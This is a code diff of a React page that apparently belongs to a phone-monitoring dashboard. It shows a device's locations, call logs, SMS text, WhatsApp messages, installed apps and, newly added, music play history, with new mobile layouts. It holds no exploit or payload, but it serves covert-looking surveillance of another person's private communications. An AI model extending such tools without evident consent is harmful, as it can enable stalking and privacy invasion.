@@ -3,11 +3,11 @@ import { useParams, useNavigate } from 'react-router-dom'
 import { MapContainer, TileLayer, Marker, Popup, Polyline, useMap } from 'react-leaflet'
 import L from 'leaflet'
 import {
-  getLocations, getCallLogs, getSmsLogs, getWhatsApp, getWhatsAppChats, getInstalledApps,
-  LocationDto, CallLogDto, SmsDto, WhatsAppDto, WhatsAppChatDto, InstalledAppDto
+  getLocations, getCallLogs, getSmsLogs, getWhatsApp, getWhatsAppChats, getInstalledApps, getMusicHistory,
+  LocationDto, CallLogDto, SmsDto, WhatsAppDto, WhatsAppChatDto, InstalledAppDto, MusicPlayDto
 } from '../api/api'
 
-type Tab = 'map' | 'calls' | 'sms' | 'wa_notifs' | 'wa_chats' | 'apps'
+type Tab = 'map' | 'calls' | 'sms' | 'wa_notifs' | 'wa_chats' | 'apps' | 'media'
 
 const iconSelected = L.divIcon({
   className: '',
@@ -66,6 +66,7 @@ const TABS: { key: Tab; label: string }[] = [
   { key: 'wa_notifs', label: '\u{1F514} Notifications' },
   { key: 'wa_chats',  label: '\u{1F4AC} WA Chats' },
   { key: 'apps',      label: '\u{1F4E6} Apps' },
+  { key: 'media',     label: '\u{1F3B5} Medias' },
 ]
 
 export default function DevicePage() {
@@ -81,6 +82,7 @@ export default function DevicePage() {
   const [whatsapp,    setWhatsapp]    = useState<WhatsAppDto[]>([])
   const [waChats,     setWaChats]     = useState<WhatsAppChatDto[]>([])
   const [apps,        setApps]        = useState<InstalledAppDto[]>([])
+  const [music,       setMusic]       = useState<MusicPlayDto[]>([])
   const [appSearch,   setAppSearch]   = useState('')
   const [activeChat,  setActiveChat]  = useState<string | null>(null)
   const msgEndRef = useRef<HTMLDivElement>(null)
@@ -92,6 +94,7 @@ export default function DevicePage() {
     getWhatsApp(deviceId).then(r => setWhatsapp(r.data)).catch(() => {})
     getWhatsAppChats(deviceId).then(r => setWaChats(r.data)).catch(() => {})
     getInstalledApps(deviceId).then(r => setApps(r.data)).catch(() => {})
+    getMusicHistory(deviceId).then(r => setMusic(r.data)).catch(() => {})
   }, [deviceId])
 
   // Auto-scroll to bottom when active chat messages change
@@ -237,75 +240,138 @@ export default function DevicePage() {
         {/* â”€â”€â”€ CALLS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
         {tab === 'calls' && (
           <div className="bg-white rounded-xl shadow-sm overflow-hidden">
-            <div className="overflow-x-auto">
-            <table className="w-full border-collapse">
-              <thead><tr><TH>Contact</TH><TH>Number</TH><TH>Type</TH><TH>Duration</TH><TH>Date</TH></tr></thead>
-              <tbody>
-                {calls.map((c, i) => (
-                  <tr key={i} className="hover:bg-gray-50">
-                    <TD>{c.name || '\u2014'}</TD>
-                    <TD>{c.number}</TD>
-                    <TD>{callType(c.type)}</TD>
-                    <TD>{c.duration}s</TD>
-                    <TD>{fmt(c.date)}</TD>
-                  </tr>
-                ))}
-                {calls.length === 0 && <tr><td colSpan={5} className="px-4 py-8 text-center text-gray-400 text-sm">No call logs yet.</td></tr>}
-              </tbody>
-            </table>
+
+            {/* Mobile */}
+            <div className="md:hidden divide-y divide-gray-100">
+              {calls.length === 0 && <p className="px-4 py-8 text-center text-gray-400 text-sm">No call logs yet.</p>}
+              {calls.map((c, i) => (
+                <div key={i} className="flex items-center gap-3 px-4 py-3">
+                  <span className="text-2xl flex-shrink-0">
+                    {c.type === 1 ? '📲' : c.type === 2 ? '📤' : '❌'}
+                  </span>
+                  <div className="flex-1 min-w-0">
+                    <p className="text-sm font-semibold text-gray-800 truncate">{c.name || c.number}</p>
+                    {c.name && <p className="text-xs text-gray-400">{c.number}</p>}
+                    <p className="text-xs text-gray-400">{callType(c.type)} · {c.duration}s · {fmt(c.date)}</p>
+                  </div>
+                </div>
+              ))}
             </div>
+
+            {/* Desktop */}
+            <div className="hidden md:block overflow-x-auto">
+              <table className="w-full border-collapse">
+                <thead><tr><TH>Contact</TH><TH>Number</TH><TH>Type</TH><TH>Duration</TH><TH>Date</TH></tr></thead>
+                <tbody>
+                  {calls.map((c, i) => (
+                    <tr key={i} className="hover:bg-gray-50">
+                      <TD>{c.name || '—'}</TD>
+                      <TD>{c.number}</TD>
+                      <TD>{callType(c.type)}</TD>
+                      <TD>{c.duration}s</TD>
+                      <TD>{fmt(c.date)}</TD>
+                    </tr>
+                  ))}
+                  {calls.length === 0 && <tr><td colSpan={5} className="px-4 py-8 text-center text-gray-400 text-sm">No call logs yet.</td></tr>}
+                </tbody>
+              </table>
+            </div>
+
           </div>
         )}
 
         {/* â”€â”€â”€ SMS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
         {tab === 'sms' && (
           <div className="bg-white rounded-xl shadow-sm overflow-hidden">
-            <div className="overflow-x-auto">
-            <table className="w-full border-collapse">
-              <thead><tr><TH>From/To</TH><TH>Message</TH><TH>Type</TH><TH>Date</TH></tr></thead>
-              <tbody>
-                {sms.map((m, i) => (
-                  <tr key={i} className="hover:bg-gray-50">
-                    <TD>{m.address}</TD>
-                    <TD>{m.body}</TD>
-                    <TD>{smsType(m.type)}</TD>
-                    <TD>{fmt(m.date)}</TD>
-                  </tr>
-                ))}
-                {sms.length === 0 && <tr><td colSpan={4} className="px-4 py-8 text-center text-gray-400 text-sm">No SMS logs yet.</td></tr>}
-              </tbody>
-            </table>
+
+            {/* Mobile */}
+            <div className="md:hidden divide-y divide-gray-100">
+              {sms.length === 0 && <p className="px-4 py-8 text-center text-gray-400 text-sm">No SMS logs yet.</p>}
+              {sms.map((m, i) => (
+                <div key={i} className="flex items-start gap-3 px-4 py-3">
+                  <span className="text-2xl flex-shrink-0 mt-0.5">{m.type === 1 ? '📩' : '📤'}</span>
+                  <div className="flex-1 min-w-0">
+                    <div className="flex items-center justify-between gap-2">
+                      <p className="text-sm font-semibold text-gray-800 truncate">{m.address}</p>
+                      <p className="text-xs text-gray-400 flex-shrink-0">{fmt(m.date)}</p>
+                    </div>
+                    <p className="text-sm text-gray-600 mt-0.5 break-words">{m.body}</p>
+                  </div>
+                </div>
+              ))}
             </div>
+
+            {/* Desktop */}
+            <div className="hidden md:block overflow-x-auto">
+              <table className="w-full border-collapse">
+                <thead><tr><TH>From/To</TH><TH>Message</TH><TH>Type</TH><TH>Date</TH></tr></thead>
+                <tbody>
+                  {sms.map((m, i) => (
+                    <tr key={i} className="hover:bg-gray-50">
+                      <TD>{m.address}</TD>
+                      <TD>{m.body}</TD>
+                      <TD>{smsType(m.type)}</TD>
+                      <TD>{fmt(m.date)}</TD>
+                    </tr>
+                  ))}
+                  {sms.length === 0 && <tr><td colSpan={4} className="px-4 py-8 text-center text-gray-400 text-sm">No SMS logs yet.</td></tr>}
+                </tbody>
+              </table>
+            </div>
+
           </div>
         )}
 
         {/* â”€â”€â”€ WA NOTIFS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
         {tab === 'wa_notifs' && (
           <div className="bg-white rounded-xl shadow-sm overflow-hidden">
-            <div className="overflow-x-auto">
-            <table className="w-full border-collapse">
-              <thead><tr><TH>App</TH><TH>Sender</TH><TH>Message</TH><TH>Time</TH></tr></thead>
-              <tbody>
-                {whatsapp.map((w, i) => (
-                  <tr key={i} className="hover:bg-gray-50">
-                    <TD>
-                      <div className="flex items-center gap-2">
-                        {w.appIcon
-                          ? <img src={`data:image/png;base64,${w.appIcon}`} alt="" className="w-6 h-6 rounded" />
-                          : <span className="text-lg">{'\u{1F4E6}'}</span>
-                        }
-                        <span className="font-medium text-gray-800">{w.appName || w.appPackage}</span>
-                      </div>
-                    </TD>
-                    <TD className="font-medium">{w.sender}</TD>
-                    <TD>{w.message}</TD>
-                    <TD>{fmt(w.timestamp)}</TD>
-                  </tr>
-                ))}
-                {whatsapp.length === 0 && <tr><td colSpan={4} className="px-4 py-8 text-center text-gray-400 text-sm">No notifications yet.</td></tr>}
-              </tbody>
-            </table>
+
+            {/* Mobile */}
+            <div className="md:hidden divide-y divide-gray-100">
+              {whatsapp.length === 0 && <p className="px-4 py-8 text-center text-gray-400 text-sm">No notifications yet.</p>}
+              {whatsapp.map((w, i) => (
+                <div key={i} className="flex items-start gap-3 px-4 py-3">
+                  {w.appIcon
+                    ? <img src={`data:image/png;base64,${w.appIcon}`} alt="" className="w-9 h-9 rounded flex-shrink-0 mt-0.5" />
+                    : <span className="text-2xl flex-shrink-0 mt-0.5">📦</span>
+                  }
+                  <div className="flex-1 min-w-0">
+                    <div className="flex items-center justify-between gap-2">
+                      <p className="text-xs font-semibold text-indigo-600 truncate">{w.appName || w.appPackage} · {w.sender}</p>
+                      <p className="text-xs text-gray-400 flex-shrink-0">{fmt(w.timestamp)}</p>
+                    </div>
+                    <p className="text-sm text-gray-700 mt-0.5 break-words">{w.message}</p>
+                  </div>
+                </div>
+              ))}
             </div>
+
+            {/* Desktop */}
+            <div className="hidden md:block overflow-x-auto">
+              <table className="w-full border-collapse">
+                <thead><tr><TH>App</TH><TH>Sender</TH><TH>Message</TH><TH>Time</TH></tr></thead>
+                <tbody>
+                  {whatsapp.map((w, i) => (
+                    <tr key={i} className="hover:bg-gray-50">
+                      <TD>
+                        <div className="flex items-center gap-2">
+                          {w.appIcon
+                            ? <img src={`data:image/png;base64,${w.appIcon}`} alt="" className="w-6 h-6 rounded" />
+                            : <span className="text-lg">{'\u{1F4E6}'}</span>
+                          }
+                          <span className="font-medium text-gray-800">{w.appName || w.appPackage}</span>
+                        </div>
+                      </TD>
+                      <TD className="font-medium">{w.sender}</TD>
+                      <TD>{w.message}</TD>
+                      <TD>{fmt(w.timestamp)}</TD>
+                    </tr>
+                  ))}
+                  {whatsapp.length === 0 && <tr><td colSpan={4} className="px-4 py-8 text-center text-gray-400 text-sm">No notifications yet.</td></tr>}
+                </tbody>
+              </table>
+            </div>
+
           </div>
         )}
 
@@ -408,7 +474,7 @@ export default function DevicePage() {
         {/* ─── APPS ───────────────────────────────────────────── */}
         {tab === 'apps' && (
           <div className="flex flex-col gap-3">
-            <div className="flex-shrink-0">
+            <div className="flex-shrink-0 flex items-center gap-3 flex-wrap">
               <input
                 type="search"
                 placeholder="Search apps…"
@@ -416,47 +482,149 @@ export default function DevicePage() {
                 onChange={e => setAppSearch(e.target.value)}
                 className="w-full md:w-72 px-3 py-2 text-sm border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-300"
               />
-              <span className="ml-3 text-xs text-gray-400">
+              <span className="text-xs text-gray-400">
                 {apps.filter(a =>
                   a.appName.toLowerCase().includes(appSearch.toLowerCase()) ||
                   a.packageName.toLowerCase().includes(appSearch.toLowerCase())
                 ).length} / {apps.length} apps
               </span>
             </div>
+
             <div className="bg-white rounded-xl shadow-sm overflow-hidden">
-              <div className="overflow-x-auto">
-                <table className="w-full border-collapse">
-                  <thead>
-                    <tr><TH>Icon</TH><TH>App Name</TH><TH>Package</TH><TH>Version</TH><TH>Installed</TH><TH>Last Seen</TH></tr>
-                  </thead>
-                  <tbody>
-                    {apps
-                      .filter(a =>
-                        a.appName.toLowerCase().includes(appSearch.toLowerCase()) ||
-                        a.packageName.toLowerCase().includes(appSearch.toLowerCase())
-                      )
-                      .map((a, i) => (
-                        <tr key={i} className="hover:bg-gray-50">
-                          <TD>
-                            {a.iconBase64
-                              ? <img src={`data:image/png;base64,${a.iconBase64}`} alt="" className="w-8 h-8 rounded" />
-                              : <span className="text-gray-300 text-lg">📦</span>}
-                          </TD>
-                          <TD className="font-medium">{a.appName}</TD>
-                          <TD className="font-mono text-xs text-gray-500">{a.packageName}</TD>
-                          <TD>{a.version || '—'}</TD>
-                          <TD>{fmt(a.installedAt)}</TD>
-                          <TD>{fmt(a.lastSeenAt)}</TD>
-                        </tr>
-                      ))
-                    }
-                    {apps.length === 0 && (
-                      <tr><td colSpan={6} className="px-4 py-8 text-center text-gray-400 text-sm">No app data yet. Waiting for device sync.</td></tr>
-                    )}
-                  </tbody>
-                </table>
-              </div>
+              {(() => {
+                const filtered = apps.filter(a =>
+                  a.appName.toLowerCase().includes(appSearch.toLowerCase()) ||
+                  a.packageName.toLowerCase().includes(appSearch.toLowerCase())
+                )
+                return (
+                  <>
+                    {/* Mobile */}
+                    <div className="md:hidden divide-y divide-gray-100">
+                      {filtered.length === 0 && <p className="px-4 py-8 text-center text-gray-400 text-sm">No app data yet. Waiting for device sync.</p>}
+                      {filtered.map((a, i) => (
+                        <div key={i} className="flex items-center gap-3 px-4 py-3">
+                          {a.iconBase64
+                            ? <img src={`data:image/png;base64,${a.iconBase64}`} alt="" className="w-10 h-10 rounded-xl flex-shrink-0" />
+                            : <span className="w-10 h-10 flex items-center justify-center text-2xl flex-shrink-0">📦</span>
+                          }
+                          <div className="flex-1 min-w-0">
+                            <p className="text-sm font-semibold text-gray-800 truncate">{a.appName}</p>
+                            <p className="text-xs text-gray-400 font-mono truncate">{a.packageName}</p>
+                            <p className="text-xs text-gray-400">v{a.version || '—'} · {fmt(a.lastSeenAt)}</p>
+                          </div>
+                        </div>
+                      ))}
+                    </div>
+
+                    {/* Desktop */}
+                    <div className="hidden md:block overflow-x-auto">
+                      <table className="w-full border-collapse">
+                        <thead>
+                          <tr><TH>Icon</TH><TH>App Name</TH><TH>Package</TH><TH>Version</TH><TH>Installed</TH><TH>Last Seen</TH></tr>
+                        </thead>
+                        <tbody>
+                          {filtered.map((a, i) => (
+                            <tr key={i} className="hover:bg-gray-50">
+                              <TD>
+                                {a.iconBase64
+                                  ? <img src={`data:image/png;base64,${a.iconBase64}`} alt="" className="w-8 h-8 rounded" />
+                                  : <span className="text-gray-300 text-lg">📦</span>}
+                              </TD>
+                              <TD className="font-medium">{a.appName}</TD>
+                              <TD className="font-mono text-xs text-gray-500">{a.packageName}</TD>
+                              <TD>{a.version || '—'}</TD>
+                              <TD>{fmt(a.installedAt)}</TD>
+                              <TD>{fmt(a.lastSeenAt)}</TD>
+                            </tr>
+                          ))}
+                          {filtered.length === 0 && (
+                            <tr><td colSpan={6} className="px-4 py-8 text-center text-gray-400 text-sm">No app data yet. Waiting for device sync.</td></tr>
+                          )}
+                        </tbody>
+                      </table>
+                    </div>
+                  </>
+                )
+              })()}
             </div>
+          </div>
+        )}
+
+        {/* ─── MUSIC ──────────────────────────────────────────── */}
+        {tab === 'media' && (
+          <div className="bg-white rounded-xl shadow-sm overflow-hidden">
+
+            {/* ── Mobile: card list ─────────────────────────────── */}
+            <div className="md:hidden divide-y divide-gray-100">
+              {music.length === 0 && (
+                <p className="px-4 py-8 text-center text-gray-400 text-sm">
+                  No music data yet. Requires Notification Listener permission on device.
+                </p>
+              )}
+              {music.map((m, i) => {
+                const appLabel =
+                  m.appPackage === 'com.spotify.music'                         ? '🟢 Spotify' :
+                  m.appPackage === 'com.google.android.apps.youtube.music'     ? '🔴 YT Music' :
+                  m.appPackage === 'com.apple.android.music'                   ? '🍎 Apple Music' :
+                  m.appPackage
+                const dur = m.durationMs
+                  ? `${Math.round(m.durationMs / 1000 / 60)}:${String(Math.round((m.durationMs / 1000) % 60)).padStart(2, '0')}`
+                  : null
+                return (
+                  <div key={i} className="flex items-center gap-3 px-4 py-3">
+                    {m.albumArt
+                      ? <img src={`data:image/jpeg;base64,${m.albumArt}`} className="w-9 h-9 rounded-lg object-cover flex-shrink-0" alt="art" />
+                      : <div className="w-9 h-9 rounded-lg bg-indigo-50 flex items-center justify-center text-lg flex-shrink-0">🎵</div>
+                    }
+                    <div className="flex-1 min-w-0">
+                      <p className="text-sm font-semibold text-gray-800 truncate">{m.trackTitle}</p>
+                      <p className="text-xs text-gray-500 truncate">{m.artistName || '—'}{m.albumName ? ` · ${m.albumName}` : ''}</p>
+                      <div className="flex items-center gap-2 mt-0.5 flex-wrap">
+                        <span className="text-xs text-gray-400">{appLabel}</span>
+                        {dur && <span className="text-xs text-gray-400">· {dur}</span>}
+                        <span className="text-xs text-gray-400">· {fmt(m.timestamp)}</span>
+                      </div>
+                    </div>
+                  </div>
+                )
+              })}
+            </div>
+
+            {/* ── Desktop: table ────────────────────────────────── */}
+            <div className="hidden md:block overflow-x-auto">
+              <table className="w-full border-collapse">
+                <thead>
+                  <tr><TH>{''}</TH><TH>🎵 Track</TH><TH>Artist</TH><TH>Album</TH><TH>App</TH><TH>Duration</TH><TH>Played at</TH></tr>
+                </thead>
+                <tbody>
+                  {music.map((m, i) => (
+                    <tr key={i} className="hover:bg-gray-50">
+                      <TD className="w-10 pr-0">
+                        {m.albumArt
+                          ? <img src={`data:image/jpeg;base64,${m.albumArt}`} className="w-9 h-9 rounded-lg object-cover" alt="art" />
+                          : <div className="w-9 h-9 rounded-lg bg-indigo-50 flex items-center justify-center text-sm">🎵</div>
+                        }
+                      </TD>
+                      <TD className="font-medium">{m.trackTitle}</TD>
+                      <TD>{m.artistName || '—'}</TD>
+                      <TD className="text-gray-500">{m.albumName || '—'}</TD>
+                      <TD className="font-mono text-xs text-gray-400">{
+                        m.appPackage === 'com.spotify.music'                         ? '🟢 Spotify' :
+                        m.appPackage === 'com.google.android.apps.youtube.music'     ? '🔴 YT Music' :
+                        m.appPackage === 'com.apple.android.music'                   ? '🍎 Apple Music' :
+                        m.appPackage
+                      }</TD>
+                      <TD>{m.durationMs ? `${Math.round(m.durationMs / 1000 / 60)}:${String(Math.round((m.durationMs / 1000) % 60)).padStart(2, '0')}` : '—'}</TD>
+                      <TD>{fmt(m.timestamp)}</TD>
+                    </tr>
+                  ))}
+                  {music.length === 0 && (
+                    <tr><td colSpan={7} className="px-4 py-8 text-center text-gray-400 text-sm">No music data yet. Requires Notification Listener permission on device.</td></tr>
+                  )}
+                </tbody>
+              </table>
+            </div>
+
           </div>
         )}
       </main>
